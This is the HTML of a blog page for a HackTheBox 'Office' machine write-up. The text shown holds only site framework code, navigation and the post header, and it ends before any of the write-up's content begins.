<!DOCTYPE html><html class="transition bg-[var(--page-bg)] md:text-[16px] text-[14px]" data-astro-cid-yhfudojk lang=en pathname=/posts/office/ style=--configHue:250><head><title>Office HTB Writeup - Mil4ne</title><meta charset=UTF-8><meta content="Hard Machine" name=description><meta content=Mil4ne name=author><meta content=Mil4ne property=og:site_name><meta content=https://fuwari.vercel.app/posts/office/ property=og:url><meta content="Office HTB Writeup - Mil4ne" property=og:title><meta content="Hard Machine" property=og:description><meta content=summary_large_image name=twitter:card><meta content=https://fuwari.vercel.app/posts/office/ property=twitter:url><meta content="Office HTB Writeup - Mil4ne" name=twitter:title><meta content="Hard Machine" name=twitter:description><meta content="width=device-width" name=viewport><meta content="Astro v4.11.3" name=generator><link href=/favicon/favicon-light-32.png rel=icon media="(prefers-color-scheme: light)" sizes=32x32><link href=/favicon/favicon-light-128.png rel=icon media="(prefers-color-scheme: light)" sizes=128x128><link href=/favicon/favicon-light-180.png rel=icon media="(prefers-color-scheme: light)" sizes=180x180><link href=/favicon/favicon-light-192.png rel=icon media="(prefers-color-scheme: light)" sizes=192x192><link href=/favicon/favicon-dark-32.png rel=icon media="(prefers-color-scheme: dark)" sizes=32x32><link href=/favicon/favicon-dark-128.png rel=icon media="(prefers-color-scheme: dark)" sizes=128x128><link href=/favicon/favicon-dark-180.png rel=icon media="(prefers-color-scheme: dark)" sizes=180x180><link href=/favicon/favicon-dark-192.png rel=icon media="(prefers-color-scheme: dark)" sizes=192x192><script>!function(){switch(localStorage.getItem("theme")||"auto"){case"light":document.documentElement.classList.remove("dark");break;case"dark":document.documentElement.classList.add("dark");break;case"auto":window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")}}()</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Office HTB Writeup","description":"Hard Machine","keywords":["Windows","Hard"],"author":{"@type":"Person","name":"Mil4ne","url":"https://fuwari.vercel.app/"},"datePublished":"2024-07-01"}</script><link href=https://cdn.staticfile.org/KaTeX/0.16.9/katex.min.css rel=stylesheet crossorigin=anonymous integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV><link href=https://fuwari.vercel.app/rss.xml rel=alternate title=Mil4ne type=application/rss+xml><script type=module src=/_astro/page.3zT6KwRv.js></script></head><body class="transition min-h-screen" data-astro-cid-yhfudojk style=--configHue:250><div id=config-carrier data-hue=250></div><div><div class="w-full absolute" id=banner-wrapper style=--configHue:250 data-astro-cid-yhfudojk><div class="overflow-hidden relative h-full hidden object-center object-cover"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Banner image of the blog" decoding=async height=500 loading=lazy src=/_astro/p.BxU1k-P1_ZnpuiV.webp width=500 class="w-full h-full object-cover" style=object-position:center></div></div><div class="min-h-screen gap-4 grid grid-cols-[17.5rem_auto] grid-rows-[auto_auto_1fr_auto] lg:grid-rows-[auto_1fr_auto] max-w-[var(--page-width)] md:px-4 mx-auto px-0 relative"><div class="onload-animation col-span-2 grid-rows-1 z-50" id=top-row><div class="transition absolute -top-8 bg-[var(--card-bg)] h-8 left-0 right-0"></div><div class="flex items-center justify-between card-base h-[4.5rem] max-w-[var(--page-width)] mx-auto overflow-visible px-4 rounded-t-none sticky top-0"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-[3.25rem]"><div class="flex items-center flex-row text-[var(--primary)] text-md"><svg data-icon=material-symbols:home-outline-rounded height=1.75rem viewBox="0 0 24 24" width=1.75rem class="mb-1 mr-2"><symbol id=ai:material-symbols:home-outline-rounded><path d="M6 19h3v-5q0-.425.288-.712T10 13h4q.425 0 .713.288T15 14v5h3v-9l-6-4.5L6 10zm-2 0v-9q0-.475.213-.9t.587-.7l6-4.5q.525-.4 1.2-.4t1.2.4l6 4.5q.375.275.588.7T20 10v9q0 .825-.588 1.413T18 21h-4q-.425 0-.712-.288T13 20v-5h-2v5q0 .425-.288.713T10 21H6q-.825 0-1.412-.587T4 19m8-6.75" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:home-outline-rounded></use></svg> Mil4ne</div></a><div class="hidden md:flex"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Home><div class="flex items-center">Home</div></a><a href=/archive/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Archive><div class="flex items-center">Archive</div></a><a href=/about/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=About><div class="flex items-center">About</div></a><a href=https://mil4ne.pages.dev/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Portfolio target=_blank><div class="flex items-center">Portfolio <svg data-icon=fa6-solid:arrow-up-right-from-square height=14 viewBox="0 0 512 512" width=14 class="transition -translate-y-[1px] dark:text-white/[0.2] ml-1 text-black/[0.2]"><symbol id=ai:fa6-solid:arrow-up-right-from-square><path d="M320 0c-17.7 0-32 14.3-32 32s14.3 32 32 32h82.7L201.4 265.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L448 109.3V192c0 17.7 14.3 32 32 32s32-14.3 32-32V32c0-17.7-14.3-32-32-32zM80 32C35.8 32 0 67.8 0 112v320c0 44.2 35.8 80 80 80h320c44.2 0 80-35.8 80-80V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v112c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h112c17.7 0 32-14.3 32-32s-14.3-32-32-32z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:arrow-up-right-from-square></use></svg></div></a></div><div class=flex><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(self.Astro||(self.Astro={})).load=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:load")),(()=>{var t=Object.defineProperty,e=(e,r,n)=>((e,r,n)=>r in e?t(e,r,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[r]=n)(e,"symbol"!=typeof r?r+"":r,n);{let t={0:t=>s(t),1:t=>n(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(n(t)),5:t=>new Set(n(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t)},r=e=>{let[r,n]=e;return r in t?t[r](n):void 0},n=t=>t.map(r),s=t=>"object"!=typeof t||null===t?t:Object.fromEntries(Object.entries(t).map((([t,e])=>[t,r(e)])));class i extends HTMLElement{constructor(){super(...arguments),e(this,"Component"),e(this,"hydrator"),e(this,"hydrate",(async()=>{var t;if(!this.hydrator||!this.isConnected)return;let e=null==(t=this.parentElement)?void 0:t.closest("astro-island[ssr]");if(e)return void e.addEventListener("astro:hydrate",this.hydrate,{once:!0});let r,n=this.querySelectorAll("astro-slot"),i={},o=this.querySelectorAll("template[data-astro-template]");for(let t of o){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("data-astro-template")||"default"]=t.innerHTML,t.remove())}for(let t of n){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("name")||"default"]=t.innerHTML)}try{r=this.hasAttribute("props")?s(JSON.parse(this.getAttribute("props"))):{}}catch(t){let e=this.getAttribute("component-url")||"<unknown>",r=this.getAttribute("component-export");throw r&&(e+=` (export ${r})`),console.error(`[hydrate] Error parsing props for component ${e}`,this.getAttribute("props"),t),t}await this.hydrator(this)(this.Component,r,i,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))})),e(this,"unmount",(()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))}))}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(this.hasAttribute("await-children")&&"interactive"!==document.readyState&&"complete"!==document.readyState){let t=()=>{document.removeEventListener("DOMContentLoaded",t),e.disconnect(),this.childrenConnectedCallback()},e=new MutationObserver((()=>{var e;(null==(e=this.lastChild)?void 0:e.nodeType)===Node.COMMENT_NODE&&"astro:end"===this.lastChild.nodeValue&&(this.lastChild.remove(),t())}));e.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",t)}else this.childrenConnectedCallback()}async childrenConnectedCallback(){let t=this.getAttribute("before-hydration-url");t&&await import(t),this.start()}async start(){let t=JSON.parse(this.getAttribute("opts")),e=this.getAttribute("client");if(void 0!==Astro[e])try{await Astro[e]((async()=>{let t=this.getAttribute("renderer-url"),[e,{default:r}]=await Promise.all([import(this.getAttribute("component-url")),t?import(t):()=>()=>{}]),n=this.getAttribute("component-export")||"default";if(n.includes(".")){this.Component=e;for(let t of n.split("."))this.Component=this.Component[t]}else this.Component=e[n];return this.hydrator=r,this.hydrate}),t,this)}catch(t){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,t)}else window.addEventListener(`astro:${e}`,(()=>this.start()),{once:!0})}attributeChangedCallback(){this.hydrate()}}e(i,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",i)}})()</script><astro-island await-children="" client=load component-export=default component-url=/_astro/Search.ilu1Y6_L.js opts={&quot;name&quot;:&quot;Search&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=Z143CnB><div class="rounded-lg items-center bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hidden hover:bg-black/[0.06] lg:flex mr-2 transition-all" id=search-bar><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1.25rem viewBox="0 0 24 24" width=1.25rem class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 active:w-60 h-full transition-all w-40" placeholder=Search value=""></div><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 lg:hidden" aria-label="Search Panel" id=search-switch><astro-slot name=search-switch><svg data-icon=material-symbols:search height=1.25rem viewBox="0 0 24 24" width=1.25rem slot=search-switch><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot></button><div class="absolute float-panel-closed float-panel right-4 left-4 md:left-[unset] md:w-[30rem] p-2 rounded-2xl search-panel shadow-2xl top-20" id=search-panel><div class="flex items-center relative bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hover:bg-black/[0.06] lg:hidden rounded-xl transition-all" id=search-bar-inside><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1.25rem viewBox="0 0 24 24" width=1.25rem class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 absolute inset-0" placeholder=Search value=""></div></div><template data-astro-template=arrow-icon><svg data-icon=fa6-solid:chevron-right height=0.75rem viewBox="0 0 320 512" width=0.75rem class="transition text-[var(--primary)] my-auto translate-x-0.5" slot=arrow-icon><symbol id=ai:fa6-solid:chevron-right><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256L73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:chevron-right></use></svg></template></astro-island><astro-island await-children="" client=load component-export=default component-url=/_astro/LightDarkSwitch.CAE8sFjn.js opts={&quot;name&quot;:&quot;LightDarkSwitch&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=Z3Vi0Q><div class="relative z-50" role=menu tabindex=-1><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 relative" aria-label="Light/Dark Mode" id=scheme-switch role=menuitem><div class="absolute opacity-0"></div><div class="absolute opacity-0"></div><div class=absolute></div></button><div class="transition absolute -right-2 float-panel-closed hidden lg:block pt-5 top-11" id=light-dark-panel><div class="card-base float-panel p-2"><button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Light</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Dark</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap current-theme-btn">System</button></div></div></div></astro-island><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 md:hidden" aria-label=Menu id=nav-menu-switch name="Nav Menu"><svg data-icon=material-symbols:menu-rounded height=1.25rem viewBox="0 0 24 24" width=1.25rem><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></button></div><div class="absolute float-panel-closed float-panel right-4 fixed px-2 py-2 transition-all" id=nav-menu-panel><a href=/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Home</div><svg data-icon=material-symbols:chevron-right-rounded height=20 viewBox="0 0 24 24" width=20 class="transition text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/archive/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Archive</div><svg data-icon=material-symbols:chevron-right-rounded height=20 viewBox="0 0 24 24" width=20 class="transition text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/about/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">About</div><svg data-icon=material-symbols:chevron-right-rounded height=20 viewBox="0 0 24 24" width=20 class="transition text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=https://mil4ne.pages.dev/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2" target=_blank><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Portfolio</div><svg data-icon=fa6-solid:arrow-up-right-from-square height=12 viewBox="0 0 512 512" width=12 class="transition -translate-x-1 dark:text-white/25 text-black/25"><use xlink:href=#ai:fa6-solid:arrow-up-right-from-square></use></svg></a></div></div><script>!async function(){const i=await import("/pagefind/pagefind.js");await i.options({excerptLength:20}),i.init(),window.pagefind=i,i.search("")}()</script></div><div class="w-full col-span-2 lg:col-span-1 lg:max-w-[17.5rem] lg:row-end-3 lg:row-start-2 onload-animation row-end-4 row-start-3" id=sidebar><div class="flex w-full gap-4 flex-col mb-4"><div class="card-base p-3"><a href=/about/ class="overflow-hidden relative rounded-xl active:scale-95 block group lg:max-w-none lg:mt-0 lg:mx-0 max-w-[240px] mb-3 mt-1 mx-auto" aria-label="Go to About Page"><div class="transition flex items-center justify-center absolute group-active:bg-black/50 group-hover:bg-black/30 h-full pointer-events-none w-full z-50"><svg data-icon=fa6-regular:address-card height=1em viewBox="0 0 576 512" width=1.13em class="transition group-hover:opacity-100 opacity-0 text-5xl text-white"><symbol id=ai:fa6-regular:address-card><path d="M512 80c8.8 0 16 7.2 16 16v320c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V96c0-8.8 7.2-16 16-16zM64 32C28.7 32 0 60.7 0 96v320c0 35.3 28.7 64 64 64h448c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64zm144 224a64 64 0 1 0 0-128a64 64 0 1 0 0 128m-32 32c-44.2 0-80 35.8-80 80c0 8.8 7.2 16 16 16h192c8.8 0 16-7.2 16-16c0-44.2-35.8-80-80-80zm200-144c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-regular:address-card></use></svg></div><div class="overflow-hidden relative h-full lg:mt-0 lg:w-full mx-auto"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Profile Image of the Author" decoding=async height=500 loading=lazy src=/_astro/p.BxU1k-P1_ZnpuiV.webp width=500 class="w-full h-full object-cover" style=object-position:center></div></a><div class="transition font-bold dark:text-neutral-50 mb-1 text-center text-xl">Mil4ne</div><div class="transition mb-2 bg-[var(--primary)] h-1 mx-auto rounded-full w-5"></div><div class="transition text-center mb-2.5 text-neutral-400">#road-to-cpts</div><div class="flex gap-2 justify-center mb-1"><a href="" class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Twitter target=_blank rel=me><svg data-icon=fa6-brands:discord height=1.5rem viewBox="0 0 640 512" width=1.5rem><symbol id=ai:fa6-brands:discord><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485.065 485.065 0 0 0 404.081 32.03a1.816 1.816 0 0 0-1.923.91a337.461 337.461 0 0 0-14.9 30.6a447.848 447.848 0 0 0-134.426 0a309.541 309.541 0 0 0-15.135-30.6a1.89 1.89 0 0 0-1.924-.91a483.689 483.689 0 0 0-119.688 37.107a1.712 1.712 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.016 2.016 0 0 0 .765 1.375a487.666 487.666 0 0 0 146.825 74.189a1.9 1.9 0 0 0 2.063-.676A348.2 348.2 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588a321.173 321.173 0 0 1-45.868-21.853a1.885 1.885 0 0 1-.185-3.126a251.047 251.047 0 0 0 9.109-7.137a1.819 1.819 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.812 1.812 0 0 1 1.924.233a234.533 234.533 0 0 0 9.132 7.16a1.884 1.884 0 0 1-.162 3.126a301.407 301.407 0 0 1-45.89 21.83a1.875 1.875 0 0 0-1 2.611a391.055 391.055 0 0 0 30.014 48.815a1.864 1.864 0 0 0 2.063.7A486.048 486.048 0 0 0 610.7 405.729a1.882 1.882 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541M222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239c0 32.654-23.41 59.241-52.843 59.241m195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239c0 32.654-23.177 59.241-52.844 59.241" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:discord></use></svg> </a><a href=https://www.linkedin.com/in/mil4ne/ class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Linkedin target=_blank rel=me><svg data-icon=fa6-brands:linkedin height=1.5rem viewBox="0 0 448 512" width=1.5rem><symbol id=ai:fa6-brands:linkedin><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:linkedin></use></svg> </a><a href=https://github.com/mil4ne class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=GitHub target=_blank rel=me><svg data-icon=fa6-brands:github height=1.5rem viewBox="0 0 496 512" width=1.5rem><symbol id=ai:fa6-brands:github><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6c-3.3.3-5.6-1.3-5.6-3.6c0-2 2.3-3.6 5.2-3.6c3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9c2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9c.3 2 2.9 3.3 5.9 2.6c2.9-.7 4.9-2.6 4.6-4.6c-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2c12.8 2.3 17.3-5.6 17.3-12.1c0-6.2-.3-40.4-.3-61.4c0 0-70 15-84.7-29.8c0 0-11.4-29.1-27.8-36.6c0 0-22.9-15.7 1.6-15.4c0 0 24.9 2 38.6 25.8c21.9 38.6 58.6 27.5 72.9 20.9c2.3-16 8.8-27.1 16-33.7c-55.9-6.2-112.3-14.3-112.3-110.5c0-27.5 7.6-41.3 23.6-58.9c-2.6-6.5-11.1-33.3 2.6-67.9c20.9-6.5 69 27 69 27c20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27c13.7 34.7 5.2 61.4 2.6 67.9c16 17.7 25.8 31.5 25.8 58.9c0 96.5-58.9 104.2-114.8 110.5c9.2 7.9 17 22.9 17 46.4c0 33.7-.3 75.4-.3 83.6c0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252C496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2c1.6 1.6 3.9 2.3 5.2 1c1.3-1 1-3.3-.7-5.2c-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9c1.6 1 3.6.7 4.3-.7c.7-1.3-.3-2.9-2.3-3.9c-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2c2.3 2.3 5.2 2.6 6.5 1c1.3-1.3.7-4.3-1.3-6.2c-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9c1.6 2.3 4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2c-1.4-2.3-4-3.3-5.6-2" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:github></use></svg></a></div></div></div><div class="flex w-full gap-4 flex-col top-4 top-4 sticky"><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ombj2xyq data-id=categories style=animation-delay:150ms;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ombj2xyq>Categories</div><div class="overflow-hidden collapse-wrapper px-4" id=categories style=--collapsedHeight:7.5rem data-astro-cid-ombj2xyq><a href=/archive/category/HackTheBox/ ><button class="rounded-lg active:bg-[var(--btn-plain-bg-active)] hover:bg-[var(--btn-plain-bg-hover)] bg-none dark:hover:text-[var(--primary)] dark:text-neutral-300 h-10 hover:pl-3 hover:text-[var(--primary)] pl-2 text-neutral-700 transition-all w-full"><div class="flex items-center justify-between mr-2 relative"><div class="overflow-hidden overflow-ellipsis whitespace-nowrap text-left">HackTheBox</div><div class="transition flex items-center rounded-lg bg-[oklch(0.95_0.025_var(--hue))] dark:bg-[var(--primary)] dark:text-[var(--deep-text)] font-bold h-7 justify-center min-w-[2rem] ml-4 text-[var(--btn-content)] text-sm">18</div></div></button></a></div></widget-layout><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ombj2xyq data-id=tags style=animation-delay:.2s;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ombj2xyq>Tags</div><div class="overflow-hidden collapse-wrapper px-4" id=tags style=--collapsedHeight:7.5rem data-astro-cid-ombj2xyq><div class="flex flex-wrap gap-2"><a href=/archive/tag/Easy/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Easy tag">Easy </a><a href=/archive/tag/Hard/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Hard tag">Hard </a><a href=/archive/tag/Linux/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Linux tag">Linux </a><a href=/archive/tag/Medium/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Medium tag">Medium </a><a href=/archive/tag/Windows/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Windows tag">Windows</a></div></div></widget-layout></div></div><div class="overflow-hidden onload-animation col-span-2 lg:col-span-1 row-end-3 row-start-2" id=content-wrapper><main class=transition-fade id=swup><div class="flex w-full mb-4 overflow-hidden relative rounded-[var(--radius-large)]"><div class="w-full relative card-base md:px-9 pb-4 pt-6 px-6 z-10" id=post-container><div class="transition flex dark:text-white/30 flex-row gap-5 mb-3 onload-animation text-black/30"><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:notes-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:notes-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h10q.425 0 .713.288T15 17t-.288.713T14 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:notes-rounded></use></svg></div><div class=text-sm>3757 words</div></div><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:schedule-outline-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:schedule-outline-rounded><path d="M13 11.6V8q0-.425-.288-.712T12 7t-.712.288T11 8v3.975q0 .2.075.388t.225.337l3.3 3.3q.275.275.7.275T16 16t.275-.7t-.275-.7zM12 22q-2.075 0-3.9-.788t-3.175-2.137T2.788 15.9T2 12t.788-3.9t2.137-3.175T8.1 2.788T12 2t3.9.788t3.175 2.137T21.213 8.1T22 12t-.788 3.9t-2.137 3.175t-3.175 2.138T12 22m0-2q3.325 0 5.663-2.337T20 12t-2.337-5.663T12 4T6.337 6.338T4 12t2.338 5.663T12 20" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:schedule-outline-rounded></use></svg></div><div class=text-sm>19 minutes</div></div></div><div class="onload-animation relative"><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-5 before:left-[-1.125rem] before:top-[0.75rem] block dark:text-white/90 mb-3 md:before:w-1 md:text-[2.5rem]/[2.75rem] text-3xl text-black/90 w-full" data-pagefind-body data-pagefind-meta=title data-pagefind-weight=10>Office HTB Writeup</div></div><div class=onload-animation><div class="flex items-center gap-4 dark:text-neutral-400 flex-wrap gap-x-4 gap-y-2 mb-5 text-neutral-500" data-astro-cid-aj5jodn5><div class="flex items-center" data-astro-cid-aj5jodn5><div class=meta-icon data-astro-cid-aj5jodn5><svg data-icon=material-symbols:calendar-today-outline-rounded height=1em viewBox="0 0 24 24" width=1em class=text-xl data-astro-cid-aj5jodn5><symbol id=ai:material-symbols:calendar-today-outline-rounded><path d="M5 22q-.825 0-1.412-.587T3 20V6q0-.825.588-1.412T5 4h1V3q0-.425.288-.712T7 2t.713.288T8 3v1h8V3q0-.425.288-.712T17 2t.713.288T18 3v1h1q.825 0 1.413.588T21 6v14q0 .825-.587 1.413T19 22zm0-2h14V10H5zM5 